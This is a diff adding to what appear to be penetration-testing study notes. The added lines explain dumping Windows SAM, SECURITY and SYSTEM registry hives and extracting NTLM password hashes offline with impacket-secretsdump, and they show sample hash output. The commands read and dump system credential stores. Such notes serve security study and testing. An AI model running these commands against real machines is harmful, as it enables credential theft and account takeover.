@@ -156,3 +156,17 @@ reg save HKLM\SAM SAM.bak
 reg save HKLM\SECURITY SECURITY.bak
 reg save HKLM\SYSTEM SYSTEM.bak
 ```
+* Once the hives are backed up and transferred to the attacking machine, you can use `impacket` to obtain hashes with `impacket-secretsdump -sam SAM.bak -system SYSTEM.bak -security SECURITY.bak LOCAL`. The LOCAL portion of the command replaces the host parameter you'd normally use for `impacket-secretsdump`, letting it know that this is an offline dump.
+  * The output format will always be **Username:SID:LM HASH:NTLM HASH**. See example below:
+ ```
+[*] Target system bootKey: 0x0e34e1028a848aa7b0bc6eb236c0f229
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3b1b47e42e0463276e3ded6cef349f93:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:d7da45674bae3a0476c0f64b67121f7d:::
+iml-user:1000:aad3b435b51404eeaad3b435b51404ee:3b1b47e42e0463276e3ded6cef349f93:::
+```
+  * Although LM hashes are no longer used, the empty LM hash is added to the user's hash for backward compatability reasons.
+  *  `aad3b435b51404eeaad3b435b51404ee` is the LM hash for empty password. Important to remember!
+  *  Accounts with an SID of 5xx are system accounts, while accounts with 1xxx are created by the admin. In this example (`iml-user:1000:aad3b435b51404eeaad3b435b51404ee:3b1b47e42e0463276e3ded6cef349f93:::`), iml-user was added by an admin.  
